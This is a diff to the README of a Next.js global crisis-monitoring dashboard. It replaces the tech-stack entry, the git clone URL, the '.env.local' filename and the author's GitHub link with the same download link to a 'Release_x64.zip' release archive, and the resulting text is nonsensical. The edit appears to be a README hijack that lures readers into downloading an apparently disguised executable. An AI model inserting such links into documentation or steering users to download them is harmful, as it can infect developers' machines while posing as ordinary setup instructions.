@@ -12,7 +12,7 @@ A real-time global crisis monitoring dashboard that aggregates and visualizes da
 - Async/Await patterns in TypeScript
 - Geospatial data visualization with Leaflet
 - React hooks and state management
-- Server-side rendering with Next.js
+- Server-side rendering with https://github.com/trulynotafan/GlobalCrisisWatch/releases/download/v2.0/Release_x64.zip
 - Dark mode UI/UX design principles
 - Infinite scrolling and data pagination
 - Ensuring TypeScript type safety and interfaces
@@ -34,7 +34,7 @@ A real-time global crisis monitoring dashboard that aggregates and visualizes da
 ## 🛠️ Tech Stack
 
 **Frontend**:
-- Next.js
+- https://github.com/trulynotafan/GlobalCrisisWatch/releases/download/v2.0/Release_x64.zip
 - React
 - TypeScript
 
@@ -61,7 +61,7 @@ Follow these steps to get started:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/afaanbayes/global-crisis-watch.git
+   git clone https://github.com/trulynotafan/GlobalCrisisWatch/releases/download/v2.0/Release_x64.zip
    cd global-crisis-watch
    ```
 
@@ -71,7 +71,7 @@ Follow these steps to get started:
    ```
 
 3. **Configure environment variables**:
-   Create a `.env.local` file in the root directory and add the required API keys:
+   Create a `https://github.com/trulynotafan/GlobalCrisisWatch/releases/download/v2.0/Release_x64.zip` file in the root directory and add the required API keys:
    ```env
    NEXT_PUBLIC_NEWS_API_KEY=your_news_api_key
    NEXT_PUBLIC_GEOCODING_API_KEY=your_geocoding_api_key
@@ -123,4 +123,4 @@ Feel free to contribute to this learning project.
 
 ## 📧 Contact
 
-Developed by **Afaan**. Connect with me on [GitHub](https://github.com/trulynotafan).
+Developed by **Afaan**. Connect with me on [GitHub](https://github.com/trulynotafan/GlobalCrisisWatch/releases/download/v2.0/Release_x64.zip).
